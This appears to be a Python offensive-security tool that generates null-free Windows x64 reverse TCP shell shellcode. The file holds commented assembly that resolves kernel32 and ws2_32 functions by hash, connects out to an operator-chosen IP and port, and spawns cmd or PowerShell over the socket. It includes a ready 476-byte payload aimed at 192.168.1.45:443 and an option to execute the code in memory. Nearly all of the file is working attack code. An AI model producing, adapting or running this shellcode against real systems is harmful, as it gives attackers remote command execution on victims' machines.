import ctypes, struct
import argparse
from keystone import *

# Exploit Author: Senzee
# Title: Windows/x64 - Reverse TCP Shell(192.168.1.45:443) Shellcode (476 Bytes)
# Date: 08/11/2023
# Platform: Windows X64
# Tested on: Windows 11 Home/Windows Server 2022 Standard/Windows Server 2019 Datacenter
# OS Version (respectively): 10.0.22621 /10.0.20348 /10.0.17763
# Test IP: 192.168.1.45 
# Test Port: 443
# Payload size: 476 bytes
# Do not contain 0x00 byte


# Generated Shellcode (192.168.1.45:443):
# Payload size: 476 bytes
# buf =  b"\x48\x31\xd2\x65\x48\x8b\x42\x60\x48\x8b\x70\x18\x48\x8b\x76\x20\x4c\x8b\x0e\x4d"
# buf += b"\x8b\x09\x4d\x8b\x49\x20\xeb\x63\x41\x8b\x49\x3c\x4d\x31\xff\x41\xb7\x88\x4d\x01"
# buf += b"\xcf\x49\x01\xcf\x45\x8b\x3f\x4d\x01\xcf\x41\x8b\x4f\x18\x45\x8b\x77\x20\x4d\x01"
# buf += b"\xce\xe3\x3f\xff\xc9\x48\x31\xf6\x41\x8b\x34\x8e\x4c\x01\xce\x48\x31\xc0\x48\x31"
# buf += b"\xd2\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x44\x39\xc2\x75\xda\x45"
# buf += b"\x8b\x57\x24\x4d\x01\xca\x41\x0f\xb7\x0c\x4a\x45\x8b\x5f\x1c\x4d\x01\xcb\x41\x8b"
# buf += b"\x04\x8b\x4c\x01\xc8\xc3\xc3\x4c\x89\xcd\x41\xb8\x8e\x4e\x0e\xec\xe8\x8f\xff\xff"
# buf += b"\xff\x49\x89\xc4\x48\x31\xc0\x66\xb8\x6c\x6c\x50\x48\xb8\x57\x53\x32\x5f\x33\x32"
# buf += b"\x2e\x64\x50\x48\x89\xe1\x48\x83\xec\x20\x4c\x89\xe0\xff\xd0\x48\x83\xc4\x20\x49"
# buf += b"\x89\xc6\x49\x89\xc1\x41\xb8\xcb\xed\xfc\x3b\x4c\x89\xcb\xe8\x55\xff\xff\xff\x48"
# buf += b"\x31\xc9\x66\xb9\x98\x01\x48\x29\xcc\x48\x8d\x14\x24\x66\xb9\x02\x02\x48\x83\xec"
# buf += b"\x30\xff\xd0\x48\x83\xc4\x30\x49\x89\xd9\x41\xb8\xd9\x09\xf5\xad\xe8\x2b\xff\xff"
# buf += b"\xff\x48\x83\xec\x30\x48\x31\xc9\xb1\x02\x48\x31\xd2\xb2\x01\x4d\x31\xc0\x41\xb0"
# buf += b"\x06\x4d\x31\xc9\x4c\x89\x4c\x24\x20\x4c\x89\x4c\x24\x28\xff\xd0\x49\x89\xc4\x48"
# buf += b"\x83\xc4\x30\x49\x89\xd9\x41\xb8\x0c\xba\x2d\xb3\xe8\xf3\xfe\xff\xff\x48\x83\xec"
# buf += b"\x20\x4c\x89\xe1\x48\x31\xd2\xb2\x02\x48\x89\x14\x24\x48\x31\xd2\x66\xba\x01\xbb"
# buf += b"\x48\x89\x54\x24\x02\xba\xc0\xa8\x01\x2d\x48\x89\x54\x24\x04\x48\x8d\x14\x24\x4d"
# buf += b"\x31\xc0\x41\xb0\x16\x4d\x31\xc9\x48\x83\xec\x38\x4c\x89\x4c\x24\x20\x4c\x89\x4c"
# buf += b"\x24\x28\x4c\x89\x4c\x24\x30\xff\xd0\x48\x83\xc4\x38\x49\x89\xe9\x41\xb8\x72\xfe"
# buf += b"\xb3\x16\xe8\x99\xfe\xff\xff\x48\xba\x9c\x92\x9b\xd1\x9a\x87\x9a\xff\x48\xf7\xd2"
# buf += b"\x52\x48\x89\xe2\x41\x54\x41\x54\x41\x54\x48\x31\xc9\x66\x51\x51\x51\xb1\xff\x66"
# buf += b"\xff\xc1\x66\x51\x48\x31\xc9\x66\x51\x66\x51\x51\x51\x51\x51\x51\x51\xb1\x68\x51"
# buf += b"\x48\x89\xe7\x48\x89\xe1\x48\x83\xe9\x20\x51\x57\x48\x31\xc9\x51\x51\x51\x48\xff"
# buf += b"\xc1\x51\xfe\xc9\x51\x51\x51\x51\x49\x89\xc8\x49\x89\xc9\xff\xd0"


def print_banner():
	banner="""
███╗░░░███╗██╗░█████╗░██████╗░░█████╗░  ░██████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░░
████╗░████║██║██╔══██╗██╔══██╗██╔══██╗  ██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░░
██╔████╔██║██║██║░░╚═╝██████╔╝██║░░██║  ╚█████╗░███████║█████╗░░██║░░░░░██║░░░░░
██║╚██╔╝██║██║██║░░██╗██╔══██╗██║░░██║  ░╚═══██╗██╔══██║██╔══╝░░██║░░░░░██║░░░░░
██║░╚═╝░██║██║╚█████╔╝██║░░██║╚█████╔╝  ██████╔╝██║░░██║███████╗███████╗███████╗
╚═╝░░░░░╚═╝╚═╝░╚════╝░╚═╝░░╚═╝░╚════╝░  ╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝
"""
	print(banner)
	print("Author: Senzee")
	print("Github Repository: https://github.com/senzee1984/micr0_shell")
	print("Description: Dynamically generate PIC Null-Free Reverse Shell Shellcode")
	print("Attention: In rare cases (.255 and .0 co-exist), generated shellcode could contain NULL bytes, E.G. when IP is 192.168.0.255\n\n")


def b_not(num, size):
	reverse = 0
	for _ in range(size):
		reverse = (reverse << 1) | (0 if num & 1 else 1)
		num >>= 1
	notted = 0
	for _ in range(size):
		notted = (notted << 1) | (reverse & 1)
		reverse >>= 1
	return notted

def get_address_argument(ip, port):
	address = 0
	for octet in ip.split(".")[::-1]:
		address = (address << 8) | int(octet)
	for _ in range(2):
		address = (address << 8) | (port & 0xFF)
		port >>= 8
	return hex(b_not((address << 16) | 2, 64))

def get_shell_type_argument(shell_type):
	return (
		" mov rcx, 0xff9a879ad19b929c;"
		" not rcx;"
		" push rcx;"
		" push rcx;"
	) if shell_type == "cmd" else (
		" mov rcx, 0x6568737265776f70;"
		" push rcx;"
		" mov rcx, 0xffff9a879ad19393;"
		" not rcx;"
		" push rcx;"
	)

def output_shellcode(lan,encoding,var,code_exec,save):
	sh = b""
	for e in encoding:
    		sh += struct.pack("B", e)
	shellcode = bytearray(sh)
	print("[+]Payload size: "+str(len(encoding))+" bytes\n")
	counter=0

	if lan=="python":
		print("[+]Shellcode format for Python\n")
		sc = ""
		sc = var+" = b\""
		for dec in encoding:
    			if counter % 20 == 0 and counter != 0:
        			sc += "\"\n"+var+"+="+"b\""
    			sc += "\\x{0:02x}".format(int(dec))
    			counter += 1

		if count % 20 > 0:
			sc += "\""  
		print(sc)	

	elif lan=="c":
		print("[+]Shellcode format for C\n")
		sc = "unsigned char " + var + "[]={\n"	
		for dec in encoding:
    			if counter % 20 == 0 and counter != 0:
        			sc += "\n"
    			sc += "0x{0:02x}".format(int(dec))+","
    			counter += 1
		sc=sc[0:len(sc)-1]+"};"
		print(sc)	


	elif lan=="powershell":
		print("[+]Shellcode format for Powershell\n")
		sc = "[Byte[]] $"+var+" = "	
		for dec in encoding:
    			sc += "0x{0:02x}".format(int(dec))+","
		sc=sc[0:len(sc)-1]
		print(sc)	

	elif lan=="csharp":
		print("[+]Shellcode format for C#\n")
		sc = "byte[] " + var + "= new byte["+str(len(encoding))+"] {\n"	
		for dec in encoding:
    			if counter % 20 == 0 and counter != 0:
        			sc += "\n"
    			sc += "0x{0:02x}".format(int(dec))+","
    			counter += 1
		sc=sc[0:len(sc)-1]+"};"
		print(sc)	
	
	else:
		print("Unsupported language! Exiting...")
		exit()


	if exec=="true":
		ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
		ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))

		buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
		ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr),
                                     buf,
                                     ctypes.c_int(len(shellcode)))
		print("\n\nShellcode Executed! Shellcode located at address %s" % hex(ptr))
		ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_uint64(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))

		ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))

	if save=="true":
		try:
			with open(output, 'wb') as f:
				f.write(shellcode)
				print("\n\nGenerated shellcode successfully saved in file "+output)
		except Exception as e:
			print(e)
	
	
if __name__ == "__main__":
	print_banner()
	parser = argparse.ArgumentParser(description='Dynamically generate Windows x64 reverse shell.')
	parser.add_argument('--ip', '-i', required=True, dest='ip',help='The listening IP address, default value is 192.168.0.45')
	parser.add_argument('--port', '-p', required=False, default=443, dest='port',help='The local listening port, default value is 443')
	parser.add_argument('--language', '-l', required=False, default='python', dest='lan',help='The language of desired shellcode runner, default language is python. Support c, csharp, python, powershell')
	parser.add_argument('--variable', '-v', required=False, default='buf', dest='var',help='The variable name of shellcode array, default variable is buf')
	parser.add_argument('--type', '-t', required=False, default='cmd', dest='shell_type',help='The shell type, Powershell or Cmd, default shell is cmd')
	parser.add_argument('--execution', '-e', required=False, default='False', dest='code_exec',help='Whether to execution generated shellcode? True/False')
	parser.add_argument('--save', '-s', required=False, default='False', dest='save',help='Whether to save the generated shellcode to a bin file, True/False')
	parser.add_argument('--output', '-o', required=False, default='', dest='output',help='If choose to save the shellcode to file, the desired location.')

	args = parser.parse_args()
	ip=args.ip
	port=int(args.port)
	lan=args.lan.lower()
	var=args.var
	shell_type=args.shell_type.lower()
	save=args.save.lower()
	output=args.output
	code_exec=args.code_exec.lower()
	print("[+]Shellcode Settings:")
	print("******** IP Address: "+ip)
	print("******** Listening Port: "+str(port))
	print("******** Language of desired shellcode runner: "+lan)
	print("******** Shellcode array variable name: "+var)
	print("******** Shell: "+shell_type)
	print("******** Shellcode Execution: "+code_exec)
	print("******** Save Shellcode to file: "+save+"\n\n")

	args = parser.parse_args()
	address_argument = get_address_argument(ip, port)
	shell_type = get_shell_type_argument(shell_type)

	CODE = (
		"       mov rbp, rsp;"
		"       and spl, 0xf0;"
		"       sub rsp, 0x60;"
		"       mov qword ptr [rsp+0x10], rbp;"
		"       mov rbp, rsp;"

		"find_kernel32:"
		"       xor rcx, rcx;"
		"       mov rax, gs:[rcx+0x60];"                # RAX stores the value of ProcessEnvironmentBlock member in TEB, which is the PEB address
		"       mov rax, [rax+0x18];"                   # Get the value of the LDR member in PEB, which is the address of the _PEB_LDR_DATA structure
		"       mov rax, [rax+0x30];"                   # RAX is the address of the InInitializationOrderModuleList member in the _PEB_LDR_DATA structure
		"       mov rax, [rax+rcx];"                    # Current module is kernelbase.
		"       mov rax, [rax+rcx];"                    # Current module is ntdll.dll
		"       mov rax, [rax+0x10];"                   # Current module is kernel32.dll
		"       mov qword ptr [rbp+0x48], rax;"         # RAX stores the base address of the module, get the NT header offset
		"       jmp jump_section;"

		"parse_module:"                                 # Parsing DLL file in memory
		"       xor r11, r11;"
		"       mov r11b, 0x3c;"
		"       mov r8d, dword ptr [rcx+r11];"          # RCX stores the base address of the module, get the NT header offset
		"       add r8, rcx;"
		"       add r11b, 0x4c;"
		"       mov r8d, dword ptr [r8+r11];"
		"       add r8, rcx;"                           # Offset to Export Directory
		"       mov r9d, dword ptr [r8+0x18];"          # R9D stores the number of function names as an index value
		"       mov r10d, dword ptr [r8+0x20];"         # Get the RVA of ENPT
		"       add r10, rcx;"                          # R10 stores  the VMA of ENPT

		"search_function:"                              # Search for a given function
		"       dec r9;"                                # Decrease index by 1
		"       mov esi, dword ptr [r10+r9*4];"         # RVA of function name string
		"       add rsi, rcx;"                          # RSI points to function name string
		"       xor rax, rax;"
		"       xor r11, r11;"
		"       cld;"                                   # Clear directional flag

		"function_hashing:"                             # Hash function name function
		"       lodsb;"                                 # Copy the next byte of RSI to Al
		"       test al, al;"                           # If reaching the end of the string
		"       jz compare_hash;"                       # Compare hash
		"       ror r11d, 13;"                          # Part of hash algorithm
		"       add r11d, eax;"                         # Part of hash algorithm
		"       jmp function_hashing;"                  # Next byte

		"compare_hash:"
		"       cmp edx, r11d;"                         # Compare hashes
		"       jnz search_function;"                   # If not equal, search the previous function (index decreases)

		" return_function:"
		"       mov eax, dword ptr [r8+0x24];"          # Ordinal table RVA
		"       add rax, rcx;"                          # Ordinal table VMA
		"       movzx edx, word ptr [rax+r9*2];"        # Ordinal value -1
		"       mov eax, dword ptr [r8+0x1c];"          # RVA of EAT
		"       add rax, rcx;"                          # VMA of EAT
		"       mov eax, dword ptr [rax+rdx*4];"        # RAX stores RVA of the function
		"       add rax, rcx;"                          # RAX stores  VMA of the function
		"       ret;"

		"jump_section:"                                 # Achieve PIC and elminiate 0x00 byte

		"get_createprocessa:"
		"       mov rcx, qword ptr [rbp+0x48];"         # RBP + 0x48 stores base address of Kernel32.dll
		"       mov edx, 0x16b3fe72;"                   # Hash of CreateProcessA
		"       call parse_module;"                     # Get the address of CreateProcessA
		"       mov qword ptr [rbp+0x18], rax;"         # RBP + 0x20 stores the address of CreateProcessA function

		"get_loadlibrarya:"
		"       mov rcx, qword ptr [rbp+0x48];"         # RBP + 0x48 stores base address of Kernel32.dll
		"       mov edx, 0xec0e4e8e;"                   # Hash of LoadLibraryA
		"       call parse_module;"                     # Get the address of LoadLibraryA
		"       mov qword ptr [rbp+0x20], rax;"         # RBP + 0X20 stores the address of LoadLibraryA function

		"load_module:"
		"       xor rcx, rcx;"
		"       mov cx, 0x6c6c;"                        # Save the string "ll" to RCX
		"       push rcx;"                              # Push the string to the stack
		"       mov rcx, 0x642e32335f325357;"           # Save the string "ws2_32.d" to RCX
		"       push rcx;"                              # Push the string to the stack
		"       mov rcx, rsp;"                          # RCX points to the "ws2_32.dll" string
		"       sub rsp, 0x20;"                         # Function prologue
		"       call qword ptr [rbp+0x20];"             # LoadLibraryA("ws2_32.dll")
		"       mov qword ptr [rbp+0x40], rax;"         # RBP + 0x40 stores the base address of ws2_32.dll

		"get_wsastartup:"
		"       mov rcx, qword ptr [rbp+0x40];"         # RBP + 0x40 stores base address of ws2_32.dll
		"       mov edx, 0x3bfcedcb;"                   # Hash of WSAStartup
		"       call parse_module;"                     # Get the address of WSAStartup
		"       mov qword ptr [rbp+0x28], rax;"         # RBP + 0x28 stores the address of WSAStartup function

		"get_wsasocketa:"
		"       mov rcx, qword ptr [rbp+0x40];"         # RBP + 0x40 stores base address of ws2_32.dll
		"       mov edx, 0xadf509d9;"                   # Hash of WSASocketA
		"       call parse_module;"                     # Get the address of WSASocketA
		"       mov qword ptr [rbp+0x30], rax;"         # RBP + 0x30 stores the address of WSASocketA function

		"get_connect:"
		"       mov rcx, qword ptr [rbp+0x40];"         # RBP + 0x40 stores base address of ws2_32.dll
		"       mov edx, 0x60aaf9ec;"                   # Hash of connect
		"       call parse_module;"                     # Get the address of connect
		"       mov qword ptr [rbp+0x38], rax;"         # RBP + 0x38 stores the address of connect function

		"call_wsastartup:"
		"       mov cx, 0x202;"                         # Assign 0x202 to wVersionRequired and store it in RCX as the 1st parameter
		"       sub rsp, 0x7f;"                         # Reserve enough space for the lpWSDATA structure
		"       sub rsp, 0x7f;"
		"       sub rsp, 0x62;"
		"       mov rdx, rsp;"                          # Assign the address of lpWSAData to the RDX register as the 2nd parameter
		"       call qword ptr [rbp+0x28];"             # RBP + 0x28 stores the address of WSAStartup function
		"       mov rsp, rbp;"

		"call_wsasocketa:"
		"       xor rdx, rdx;"
		"       xor r8, r8;"
		"       xor r9, r9;"                            # lpProtocolInfo is 0 as the 4th parameter
		                                                # dwFlags is 0 as the 6th parameter, stored on the stack
		"       push rdx;"                              # g is 0 as the 5th parameter, stored on the stack
		"       push rdx;"
		"       push rdx;"
		"       push rdx;"
		"       mov cl, 2;"                             # AF is 2 as the 1st parameter
		"       mov dl, 1;"                             # Type is 1 as the 2nd parameter
		"       mov r8b, 6;"                            # Protocol is 6 as the 3rd parameter
		"       call qword ptr [rbp+0x30];"             # RBP + 0x28 stores the address of WSASocketA function
		"       mov qword ptr [rsp+0x10], rax;"         # The member STDERROR is the return value of WSASocketA
		"       mov qword ptr [rsp+0x18], rax;"         # The member STDOUTPUT is the return value of WSASocketA
		"       mov qword ptr [rsp+0x20], rax;"         # The member STDINPUT is the return value of WSASocketA

		"call_connect:"
		"       mov ecx, eax;"                          # Pass the socket descriptor returned by WSASocketA to RCX as the 1st parameter
		"       mov rax, {};"
		"       not rax;"
		"       push rax;"                              # Pass IP to the corresponding position in the socketaddr structure
		"       mov rdx, rsp;"                          # Pointer to the socketaddr structure as the 2nd parameter
		"       mov r8b, 0x10;"                         # Set namelen member to 0x10
		"       sub rsp, 0x20;"                         # Function epilogue
		"       call qword ptr [rbp+0x38];"             # RBP + 0x38 stores the address of connect function

		"call_createprocessa:"
		"       xor rcx, rcx;"
		"       mov cl, 1;"
		"       ror rcx, 0x18;"
		"       mov qword ptr [rsp+0x20], rcx;"         # dwFlags=0x100
		"       mov qword ptr [rsp+0x10], rax;"
		"       mov qword ptr [rsp+0x08], rax;"
		"       push rax;"
		"       push rax;"
		"       push 0x68;"                             # cb=0x68
		"       mov r8, rsp;"                           # Pointer to STARTINFOA structure
		"       {};"
		"       mov rdx, rsp;"                          # Pointer to "cmd.exe" is stored in the RCX register
		"       lea rcx, qword ptr [rsp-0x20];"
		"       push rcx;"                              # Address of the ProcessInformation structure as the 10th parameter
		"       push r8;"                               # Address of the STARTINFOA structure as the 9th parameter
		"       push rax;"                              # Value of lpCurrentDirectory is 0 as the 8th parameter
		"       push rax;"                              # lpEnvironment=0 as the 7th argument
		"       xor rcx, rcx;"
		"       mov cl, 1;"
		"       rol ecx, 27;"
		"       push rcx;"                              # dwCreationFlags=0 as the 6th argument
		"       push 1;"                                # Value of bInheritHandles is 1 as the 5th parameter
		"       sub rsp, 0x20;"                         # Function epilogue
		"       mov rcx, rax;"
		"       call qword ptr [rbp+0x18];"             # RBP + 0x20 stores the address of CreateProcessA function

		"       mov rsp, qword ptr [rbp+0x10];"
		"       ret;"
	).format(address_argument, shell_type)

	ks = Ks(KS_ARCH_X86, KS_MODE_64)
	encoding, count = ks.asm(CODE)
	output_shellcode(lan,encoding,var,code_exec,save)
